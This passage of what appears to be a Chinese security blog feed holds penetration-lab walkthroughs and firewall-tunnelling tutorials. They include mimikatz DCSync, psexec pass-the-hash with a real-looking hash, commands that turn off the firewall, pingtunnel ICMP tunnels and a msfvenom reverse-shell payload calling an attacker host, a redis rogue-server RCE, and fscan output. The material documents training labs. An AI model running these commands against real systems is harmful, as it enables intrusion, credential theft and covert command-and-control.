hj23g/1CJrWC7TlQBSw6QGjjZ7+F3XykQZiXdGU5wzYi4sGhvEBkpyGC5iZZEhVNc2YZZZnTdkSZ2MOaAeXa0bZda21dl0c+gpAxxhp/YAE6qoL/6nncn0ItHwTYexT6x+UY6Gq2Zavm0TzFkrQ3t7979PvdOCz9BsPICX7TQJYFKi7FVWh8En9suaZdnnoGtf61sKvsnGkJoiwH3VPKPb6WbGslicWhA2JAL7U8aFNXYgQcgA6mSeb8PzJ04Y9vSrSoBeYk1F/h2ZE81rppiVBWmnuS72CQ0zPfac3fWbhdBTld6Nt9Nsgqz9W/48H80kEdnlqIDf71gCb+rHeKOrxkpny45sKUd3CHiuYPhTsZvxpivLlNGIqoV+SqJNt9VfNZNXANCmr4Hpy0/11NgAK8c6gi9+MeAzg7GHK0HRXmEsYoG925aPSwrlfZZEIjR0NozP47j7XMLKgP1Lu6tSSu9B64AjTGIh8enKB/hoSKvEVie0nOERMyHKQnW7M673hHBTw2apBFlKPHxofkYq6RmRb3sOPAiqAmj0EQuaq1fupYU6iYd8LzAecGgsUZR2iwlGxRt9RtQKyiSXu0OGv9fOR5Lo3279xwOXFxoIfFaI2RNwbl55TtR6iaYV/6P87Jxkf2FtOYabi1F9nhexHm4JFfO1MShQOjgeMwgeCgAwIBAKKB2ASB1X2B0jCBz6CBzDCByTCBxqArMCmgAwIBEqEiBCCnM4CFnR8TYY5kjGPQWZbZa3P/3xCg2/q6c+qsbVTlsqEOGwxYSUFPUkFORy5MQUKiEjAQoAMCAQGhCTAHGwVEQzAxJKMHAwUAYKEAAKURGA8yMDI1MDMwODA4NDIwMlqmERgPMjAyNTAzMDgxODQyMDJapxEYDzIwMjUwMzE1MDg0MjAyWqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDFhJQU9SQU5HLkxBQg==&#x27; | base64 -d &gt; DC01.kirbi</span><br></pre></td></tr></table></figure><p>传猕猴桃，打DCSync获取域控hash</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::purge&quot; &quot;kerberos::ptt DC01.kirbi&quot; &quot;lsadump::dcsync /domain:xiaorang.lab /user:administrator&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741430716353-9b8993e2-df78-4a2e-889c-f349c45b99f8.png">拿到dc01域控，再横向一下4.19</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3  psexec.py -hashes :4889f6553239ace1f7c47fa2c619c252 xiaorang.lab/Administrator@172.22.4.19</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741430816098-c954d7fe-894a-43c3-a1b9-1d13cc82cb70.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type C:\Users\Administrator\flag\flag03.txt</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741430940264-828476af-2d72-4395-b1c9-b7d8a9b7f019.png"></p><p>根据提示再打下一台</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 psexec.py -hashes :4889f6553239ace1f7c47fa2c619c252 Administrator@172.22.4.7 </span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741431120961-3d5f24b9-ea12-4bdd-9569-a0fd104a4503.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type C:\Users\Administrator\flag\flag04.txt</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 内网攻防 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 域 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>防火墙开启状态下隧道搭建(二)</title>
      <link href="/2025/01/06/%E5%9F%9F/%E9%9A%A7%E9%81%932/"/>
      <url>/2025/01/06/%E5%9F%9F/%E9%9A%A7%E9%81%932/</url>
      
        <content type="html"><![CDATA[<h3 id="SMB-开防火墙入站只445："><a href="#SMB-开防火墙入站只445：" class="headerlink" title="SMB-开防火墙入站只445："></a>SMB-开防火墙入站只445：</h3><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1740553835240-a5f1ea2b-e79f-4bfa-aa33-fa8d6b6b0866.png"></p><p>可用于文件打印和共享</p><p>smb和上面两个icmp和dns不一样，他是为了解决入站问题</p><p>SMB一般在防火墙入站默认是开启的，判断目标端口是否开放</p><p>适用场景：防火墙放行的入口打不下利用放行的SMB移动获取权限</p><p>利用条件：密码喷射或已知口令的情况下直接正向SMB横向移动拿下</p><p>大致流程：</p><p>域控192.168.3.21</p><p>web服务器ip192.168.3.31</p><p>sql服务器ip 192.168.3.33</p><p>web服务器开放445端口，web服务器拿到shell之后，上传smb隧道木马，c2上线，ms14-058提权从webadmin到system，再cs获取密码凭证，再新建web反向监听地址192.168.3.31端口为6666 ,再横向到3.33，web服务器中转代理当作跳板机</p><h3 id="1、2场景后续穿透问题"><a href="#1、2场景后续穿透问题" class="headerlink" title="1、2场景后续穿透问题"></a>1、2场景后续穿透问题</h3><p>1、Pingtunel配合iox代理Socks内网穿透</p><p>2、dnscat2（DNS）配合上线</p><p>C2:</p><p>接收客户端传递的ICMP</p><p>.&#x2F;pingtunnel -type server -noprint 1 -nolog 1 -key 000000</p><p>将本地4455转至5566端口</p><p>.&#x2F;iox proxy -l 4455 -l 5566</p><p>Web</p><p>将本地2222的TCP封装IMCP给192.168.139.141:4455</p><p>pingtunnel -type client -l 127.0.0.1:2222 -s 192.168.139.141 -t 192.168.139.141:4455 -tcp 1 -noprint 1 -nolog 1 -key 000000</p><p>建立SockS节点绑定2222端口：</p><p>iox.exe proxy -r 127.0.0.1:2222</p><p>此时在windows上proxifier可以加载节点配置就可以访问web服务</p>]]></content>
      
      
      <categories>
          
          <category> 内网攻防 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 域 </tag>
            
            <tag> 隧道 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>防火墙开启状态下隧道搭建(一)</title>
      <link href="/2025/01/04/%E5%9F%9F/%E9%9A%A7%E9%81%931/"/>
      <url>/2025/01/04/%E5%9F%9F/%E9%9A%A7%E9%81%931/</url>
      
        <content type="html"><![CDATA[<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1740553825369-dde60bfd-547d-4214-b6c5-66c55ee412b3.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1740553806868-d105683c-fb38-4fcc-800b-93d5c49955d9.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1740553800329-a703c438-8212-412a-ac8d-a091cc73da41.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1740553790285-d85f3421-6255-46a4-93e1-c6f5dc7d64db.png"></p><p>ssh只能信息搜集，icmp可以上线c2，udp、tcp主要是用转发数据</p><h3 id="防火墙策略-入站规则-出站规则-自定义"><a href="#防火墙策略-入站规则-出站规则-自定义" class="headerlink" title="防火墙策略-入站规则&amp;出站规则&amp;自定义"></a>防火墙策略-入站规则&amp;出站规则&amp;自定义</h3><p>1、防火墙默认入站&amp;出站策略</p><p>2、防火墙自定义入站&amp;出站策略</p><p>内网域防火墙同步策略：</p><p>操作：组策略管理-域-创建GPO链接-防火墙设置</p><p>更新策略：强制&amp;命令&amp;重启</p><p>命令：gpupdate&#x2F;force</p><p>限制端口分为：入站限制端口、出站限制端口、出入站均限制端口。</p><p>入站限制端口，出站未限制端口，使用反向连接。</p><p>出站限制端口，入站未限制端口，使用正向连接。</p><p>出入站均限制端口，使用端口绕过进行连接，建议配合反向连接。</p><p>限制协议分为：</p><p>入站限制、出站限制、出入均限制，限制又分为：单协议限制、多协议限制、全部限制。</p><p>入站限制：</p><p>单协议限制，使用其它协议或者反向连接绕过。（隧道技术）</p><p>多协议限制，使用未被限制的协议或者反向连接绕过。（隧道技术）</p><p>全部协议限制，使用放弃或者反向连接绕过，但正常不会将所以协议都封闭的。</p><p>出站限制：</p><p>参考上面使用正向连接绕过。</p><p>出入均限制：</p><p>单协议限制，使用其它协议绕过。（隧道技术）</p><p>多协议限制，使用未被限制的协议绕过。（隧道技术）</p><p>全部协议限制，使用放弃绕过，但正常不会将所以协议都封闭的。</p><p>单层目标机防火墙开启上线解决方案：</p><p>1、命令关闭防火墙</p><p>2、反向中转连接上线</p><p>3、利用隧道技术上线（规则决定）</p><p>单层跳板机防火墙开启上线解决方案：</p><p>1、命令关闭防火墙</p><p>2、正向监听连接上线</p><p>3、利用隧道技术上线（规则决定）</p><p>双层防火墙开启上线解决方案：</p><p>1、命令关闭防火墙</p><p>2、利用隧道技术上线（规则决定）</p><p>防火墙实验（适用场景）：</p><p>1、内网无域环境下</p><p>2、内网有域环境下（强制策略同步）</p><p>Windows防火墙命令：</p><p>参考：<a href="https://www.cnblogs.com/tomtellyou/p/16300557.html">https://www.cnblogs.com/tomtellyou/p/16300557.html</a></p><p>查看当前防火墙状态：netsh advfirewall show allprofiles</p><p>关闭防火墙：netsh advfirewall set allprofiles state off</p><p>开启防火墙：netsh advfirewall set allprofiles state on</p><p>恢复初始防火墙设置：netsh advfirewall reset</p><p>启用桌面防火墙: netsh advfirewall set allprofiles state on</p><p>设置默认输入和输出策略：netsh advfirewall set allprofiles firewallpolicy allowinbound,allowoutbound</p><p>如果设置为拒绝使用blockinbound,blockoutbound</p><h3 id="学隧道前先搞清楚"><a href="#学隧道前先搞清楚" class="headerlink" title="学隧道前先搞清楚"></a>学隧道前先搞清楚</h3><p>0、不是有互联网才叫出网（能和其他计算机正常通讯就算出网）</p><p>1、C2常见上线采用的协议</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1740561137428-24aa4c4d-9b44-4bbc-b283-2b19cdf445ca.png"></p><p>2、常见的协议层出网判断</p><p>常用的隧道技术：</p><p>利用各种隧道技术，以网络防火墙允许的协议，</p><p>绕过网络防火墙的封锁，实现访问被封锁的目标网络</p><p>网络层：IPv6 隧道、ICMP 隧道</p><p>传输层：TCP 隧道、UDP 隧道、常规端口转发</p><p>应用层：SSH 隧道、HTTP&#x2F;S 隧道、DNS 隧道</p><h4 id="协议-判断命令"><a href="#协议-判断命令" class="headerlink" title="协议 判断命令"></a>协议 判断命令</h4><p>ICMP ping ip or domain</p><p>HTTP curl ip or domain</p><p>SSH ssh ip or domain</p><p>DNS nslookup domain</p><p>TCP telnet ip port</p><p>注意目标一定要是正常的目标</p><h3 id="开防火墙入站只80-出站只放ICMP："><a href="#开防火墙入站只80-出站只放ICMP：" class="headerlink" title="开防火墙入站只80&amp;出站只放ICMP："></a>开防火墙入站只80&amp;出站只放ICMP：</h3><p>icmp可用于文件打印和共享</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1740574068787-31e27500-bd56-4840-9e1e-d00d2e8de4fc.png"></p><p>ICMP 通过 PING 命令访问远程计算机，建立 ICMP 隧道，将 TCP&#x2F;UDP 数据封装到 ICMP 的 PING 数据包中，从而穿过防火墙，防火墙一般不会屏蔽 PING 数据包，实现不受限制的访问。</p><p>应用场景：80为入口权限点，ICMP为上线突破口</p><p>适用场景：目标入站正向被拦截，出站有ICMP出网</p><p>排查出网协议：curl nslookup ping等命令</p><p>拿到服务器权限后，先ping判断icmp能出</p><p><a href="https://github.com/esrrhs/pingtunnel">https://github.com/esrrhs/pingtunnel</a></p><p>CS:</p><p>kali攻击机上起服务</p><p>.&#x2F;pingtunnel -typeserver</p><p>将本地6666流量转发到192.168.139.141:777上面（tcp流量封装成icmp转发）</p><p>沦陷机器执行</p><p>pingtunnel -typeclient -l:6666 -s 192.168.139.141 -t 192.168.139.141:7777 -tcp 1 -noprint 1 -nolog 1</p><p>监听器配置：</p><p>127.0.0.1 6666（后门生成）</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1740574983464-3ea7dcc8-1475-40b1-8257-3884efe2de05.png"></p><p>192.168.139.141 7777（监听上线）</p><p>同理kali攻击机也加上</p><p>生成cs后门时，生成127.0.0.1:6666的后门</p><p>从攻击机上流量全是icmp流量</p><p>MSF:</p><p>生成后门：</p><p>msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;127.0.0.1LPORT&#x3D;3333 -f exe -o msf.exe</p><p>隧道：</p><p>pingtunnel -typeclient -l:3333 -s 192.168.139.141 -t 192.168.139.141:3344 -tcp 1 -noprint 1 -nolog 1</p><p>监听器配置：</p><p>msfconsole</p><p>use exploit&#x2F;multi&#x2F;handler</p><p>set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</p><p>set lhost 0.0.0.0</p><p>set lport 3344</p><p>run</p><h3 id="开防火墙入站只80-出站只放DNS："><a href="#开防火墙入站只80-出站只放DNS：" class="headerlink" title="开防火墙入站只80&amp;出站只放DNS："></a>开防火墙入站只80&amp;出站只放DNS：</h3><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1740574120561-3bb62688-6856-4ce5-a532-03e86f133ccd.png"></p><p>应用场景：80为入口权限点，DNS为上线突破口</p><p>适用场景：目标入站正向被拦截，出站有DNS出网</p><p>排查出网协议：curl nslookup ping等命令</p><p>CS:</p><p>-域名申请及配置</p><p>-监听器创建及配置</p><p>-后门绑定监听器生成</p><p>搞个域名绑定到公网服务器主机上去，在公网服务器起c2就行了</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1740576856688-413f6eaf-f123-4b69-9663-851b0f1a9506.png"></p><p>ns8.calm.com-&gt;c2.calm.com</p><p>ns9.calm.com-&gt;c2.calm.com</p><p>c2.calm.com-&gt;公网服务器ip</p><p>上线之后会发现cs页面比较慢，此时在cs命令行执行下面命令</p><p>checkin</p><p>mode dns-txt</p><p>MSF:</p><p>pro版本的reverse_dns模块</p><p><a href="https://zhuanlan.zhihu.com/p/424351656">https://zhuanlan.zhihu.com/p/424351656</a></p><p><a href="https://blog.csdn.net/vspiders/article/details/78999624">https://blog.csdn.net/vspiders/article/details/78999624</a></p><p>msf慢慢被淘汰了，因为cs有心跳包，msf是session很容易被杀</p>]]></content>
      
      
      <categories>
          
          <category> 内网攻防 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 域 </tag>
            
            <tag> 隧道 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>春秋云境-Brute4Road</title>
      <link href="/2025/01/03/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Brute4Road/"/>
      <url>/2025/01/03/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Brute4Road/</url>
      
        <content type="html"><![CDATA[<h1 id="Brute4Road"><a href="#Brute4Road" class="headerlink" title="Brute4Road"></a>Brute4Road</h1><h2 id="redis主从复制拿shell"><a href="#redis主从复制拿shell" class="headerlink" title="redis主从复制拿shell"></a>redis主从复制拿shell</h2><p>fscan扫描，6379端口开放，尝试redis漏洞，发现主从复制rce（<a href="https://github.com/n0b0dyCN/redis-rogue-server%EF%BC%89%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%EF%BC%8C%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E5%8E%9F%E7%90%86%EF%BC%9A%E4%B8%BB%E6%9C%BA%E8%B4%9F%E8%B4%A3%E5%86%99%EF%BC%8C%E4%BB%8E%E6%9C%BA%E8%B4%9F%E8%B4%A3%E8%AF%BB%EF%BC%8C%E5%AE%9E%E7%8E%B0%E8%AF%BB%E5%86%99%E5%88%86%E6%B5%81">https://github.com/n0b0dyCN/redis-rogue-server）可以利用，主从复制原理：主机负责写，从机负责读，实现读写分流</a></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741092716321-d3b5d67e-40b7-4485-9095-14d84c151540.png"></p><p>redis系列漏洞参考文章：<a href="https://www.freebuf.com/articles/web/249238.html">https://www.freebuf.com/articles/web/249238.html</a><br>在vps上执行：</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741092812558-c7fef9cf-dfa3-4240-9971-cb00215aa194.png"></p><p>输入r，反向shell</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741092950977-9c8831e5-934c-4a17-b8c8-40f85177599d.png"></p><p>此时vps再监听其他端口接受反弹的shell,弹出来shell之后创建一个伪终端</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741093101229-62ade2b8-9102-43d1-afde-6f624f99f470.png"></p><p>&#x2F;home&#x2F;redis看到flag</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741093217907-54cbd57a-3ccd-44c3-b335-c5fa16b20091.png"></p><p>cat flag发现权限不够</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741093272153-a0fb0d59-8f71-4273-bb6c-afaa8670791a.png"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>suid提权探针</p><p>find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741093368204-26e10a63-1b43-4372-a04d-8a64a6b3e80a.png"></p><p>这里用base64</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base64 &quot;/home/redis/flag/flag01&quot; | base64 --decode</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741093443543-c7b82852-e534-420c-91fc-9fb46463067d.png"></p><p>看到内网网段</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741094138850-39681a91-0a6a-4653-9f3e-19b8f4172f5a.png"></p><p>wget 下载fscan，扫描</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741094097680-ed140052-dfad-4a82-b3c8-67acd012e3ca.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line">./fscan -h 172.22.2.0/24</span><br><span class="line">┌──────────────────────────────────────────────┐</span><br><span class="line">│    ___                              _        │</span><br><span class="line">│   / _ \     ___  ___ _ __ __ _  ___| | __    │</span><br><span class="line">│  / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /    │</span><br><span class="line">│ / /_\\_____\__ \ (__| | | (_| | (__|   &lt;     │</span><br><span class="line">│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │</span><br><span class="line">└──────────────────────────────────────────────┘</span><br><span class="line">      Fscan Version: 2.0.0</span><br><span class="line"></span><br><span class="line">[2025-03-04 21:17:06] [INFO] 暴力破解线程数: 1</span><br><span class="line">[2025-03-04 21:17:06] [INFO] 开始信息扫描</span><br><span class="line">[2025-03-04 21:17:06] [INFO] CIDR范围: 172.22.2.0-172.22.2.255</span><br><span class="line">[2025-03-04 21:17:06] [INFO] 生成IP范围: 172.22.2.0.%!d(string=172.22.2.255) - %!s(MISSING).%!d(MISSING)</span><br><span class="line">[2025-03-04 21:17:06] [INFO] 解析CIDR 172.22.2.0/24 -&gt; IP范围 172.22.2.0-172.22.2.255</span><br><span class="line">[2025-03-04 21:17:06] [INFO] 最终有效主机数量: 256</span><br><span class="line">[2025-03-04 21:17:06] [INFO] 开始主机扫描</span><br><span class="line">[2025-03-04 21:17:06] [INFO] 正在尝试无监听ICMP探测...</span><br><span class="line">[2025-03-04 21:17:06] [INFO] 当前用户权限不足,无法发送ICMP包</span><br><span class="line">[2025-03-04 21:17:06] [INFO] 切换为PING方式探测...</span><br><span class="line">[2025-03-04 21:17:06] [SUCCESS] 目标 172.22.2.3      存活 (ICMP)</span><br><span class="line">[2025-03-04 21:17:06] [SUCCESS] 目标 172.22.2.7      存活 (ICMP)</span><br><span class="line">[2025-03-04 21:17:06] [SUCCESS] 目标 172.22.2.16     存活 (ICMP)</span><br><span class="line">[2025-03-04 21:17:07] [SUCCESS] 目标 172.22.2.18     存活 (ICMP)</span><br><span class="line">[2025-03-04 21:17:07] [SUCCESS] 目标 172.22.2.34     存活 (ICMP)</span><br><span class="line">[2025-03-04 21:17:12] [INFO] 存活主机数量: 5</span><br><span class="line">[2025-03-04 21:17:12] [INFO] 有效端口数量: 233</span><br><span class="line">[2025-03-04 21:17:13] [SUCCESS] 端口开放 172.22.2.18:80</span><br><span class="line">[2025-03-04 21:17:13] [SUCCESS] 端口开放 172.22.2.16:80</span><br><span class="line">[2025-03-04 21:17:13] [SUCCESS] 端口开放 172.22.2.18:22</span><br><span class="line">[2025-03-04 21:17:13] [SUCCESS] 端口开放 172.22.2.7:80</span><br><span class="line">[2025-03-04 21:17:13] [SUCCESS] 端口开放 172.22.2.7:22</span><br><span class="line">[2025-03-04 21:17:13] [SUCCESS] 端口开放 172.22.2.7:21</span><br><span class="line">[2025-03-04 21:17:13] [SUCCESS] 端口开放 172.22.2.3:135</span><br><span class="line">[2025-03-04 21:17:13] [SUCCESS] 端口开放 172.22.2.34:135</span><br><span class="line">[2025-03-04 21:17:13] [SUCCESS] 端口开放 172.22.2.3:139</span><br><span class="line">[2025-03-04 21:17:13] [SUCCESS] 端口开放 172.22.2.16:135</span><br><span class="line">[2025-03-04 21:17:13] [SUCCESS] 端口开放 172.22.2.18:445</span><br><span class="line">[2025-03-04 21:17:13] [SUCCESS] 端口开放 172.22.2.34:139</span><br><span class="line">[2025-03-04 21:17:13] [SUCCESS] 端口开放 172.22.2.34:445</span><br><span class="line">[2025-03-04 21:17:13] [SUCCESS] 端口开放 172.22.2.16:445</span><br><span class="line">[2025-03-04 21:17:13] [SUCCESS] 端口开放 172.22.2.18:139</span><br><span class="line">[2025-03-04 21:17:13] [SUCCESS] 端口开放 172.22.2.3:389</span><br><span class="line">[2025-03-04 21:17:13] [SUCCESS] 端口开放 172.22.2.3:445</span><br><span class="line">[2025-03-04 21:17:13] [SUCCESS] 端口开放 172.22.2.16:139</span><br><span class="line">[2025-03-04 21:17:13] [SUCCESS] 端口开放 172.22.2.3:88</span><br><span class="line">[2025-03-04 21:17:13] [SUCCESS] 端口开放 172.22.2.16:1433</span><br><span class="line">[2025-03-04 21:17:13] [SUCCESS] 端口开放 172.22.2.7:6379</span><br><span class="line">[2025-03-04 21:17:13] [SUCCESS] 服务识别 172.22.2.18:22 =&gt; [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.5 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.]</span><br><span class="line">[2025-03-04 21:17:13] [SUCCESS] 服务识别 172.22.2.7:22 =&gt; [ssh] 版本:7.4 产品:OpenSSH 信息:protocol 2.0 Banner:[SSH-2.0-OpenSSH_7.4.]</span><br><span class="line">[2025-03-04 21:17:13] [SUCCESS] 服务识别 172.22.2.7:21 =&gt; [ftp] 版本:3.0.2 产品:vsftpd 系统:Unix Banner:[220 (vsFTPd 3.0.2).]</span><br><span class="line">[2025-03-04 21:17:18] [SUCCESS] 服务识别 172.22.2.16:80 =&gt; [http] 版本:2.0 产品:Microsoft HTTPAPI httpd 系统:Windows</span><br><span class="line">[2025-03-04 21:17:18] [SUCCESS] 服务识别 172.22.2.7:80 =&gt; [http] 版本:1.20.1 产品:nginx</span><br><span class="line">[2025-03-04 21:17:18] [SUCCESS] 服务识别 172.22.2.3:139 =&gt;  Banner:[.]</span><br><span class="line">[2025-03-04 21:17:18] [SUCCESS] 服务识别 172.22.2.34:139 =&gt;  Banner:[.]</span><br><span class="line">[2025-03-04 21:17:18] [SUCCESS] 服务识别 172.22.2.34:445 =&gt; </span><br><span class="line">[2025-03-04 21:17:18] [SUCCESS] 服务识别 172.22.2.16:445 =&gt; </span><br><span class="line">[2025-03-04 21:17:18] [SUCCESS] 服务识别 172.22.2.3:389 =&gt; [ldap] 产品:Microsoft Windows Active Directory LDAP 系统:Windows 信息:Domain: xiaorang.lab, Site: Default-First-Site-Name</span><br><span class="line">[2025-03-04 21:17:18] [SUCCESS] 服务识别 172.22.2.3:445 =&gt; </span><br><span class="line">[2025-03-04 21:17:18] [SUCCESS] 服务识别 172.22.2.16:139 =&gt;  Banner:[.]</span><br><span class="line">[2025-03-04 21:17:19] [SUCCESS] 服务识别 172.22.2.3:88 =&gt; </span><br><span class="line">[2025-03-04 21:17:19] [SUCCESS] 服务识别 172.22.2.16:1433 =&gt; [ms-sql-s] 版本:13.00.4001; SP1 产品:Microsoft SQL Server 2016 系统:Windows Banner:[.%.]</span><br><span class="line">[2025-03-04 21:17:20] [SUCCESS] 服务识别 172.22.2.18:80 =&gt; [http]</span><br><span class="line">[2025-03-04 21:18:13] [SUCCESS] 服务识别 172.22.2.18:445 =&gt; </span><br><span class="line">[2025-03-04 21:18:13] [SUCCESS] 服务识别 172.22.2.18:139 =&gt; </span><br><span class="line">[2025-03-04 21:18:14] [SUCCESS] 服务识别 172.22.2.7:6379 =&gt; </span><br><span class="line">[2025-03-04 21:18:18] [SUCCESS] 服务识别 172.22.2.3:135 =&gt; </span><br><span class="line">[2025-03-04 21:18:18] [SUCCESS] 服务识别 172.22.2.34:135 =&gt; </span><br><span class="line">[2025-03-04 21:18:18] [SUCCESS] 服务识别 172.22.2.16:135 =&gt; </span><br><span class="line">[2025-03-04 21:18:18] [INFO] 存活端口数量: 21</span><br><span class="line">[2025-03-04 21:18:18] [INFO] 开始漏洞扫描</span><br><span class="line">[2025-03-04 21:18:18] [INFO] 加载的插件: findnet, ftp, ldap, ms17010, mssql, netbios, redis, smb, smb2, smbghost, ssh, webpoc, webtitle</span><br><span class="line">[2025-03-04 21:18:18] [SUCCESS] NetInfo 扫描结果</span><br><span class="line">目标主机: 172.22.2.16</span><br><span class="line">主机名: MSSQLSERVER</span><br><span class="line">发现的网络接口:</span><br><span class="line">   IPv4地址:</span><br><span class="line">      └─ 172.22.2.16</span><br><span class="line">[2025-03-04 21:18:18] [SUCCESS] 网站标题 http://172.22.2.7         状态码:200 长度:4833   标题:Welcome to CentOS</span><br><span class="line">[2025-03-04 21:18:18] [SUCCESS] 网站标题 http://172.22.2.16        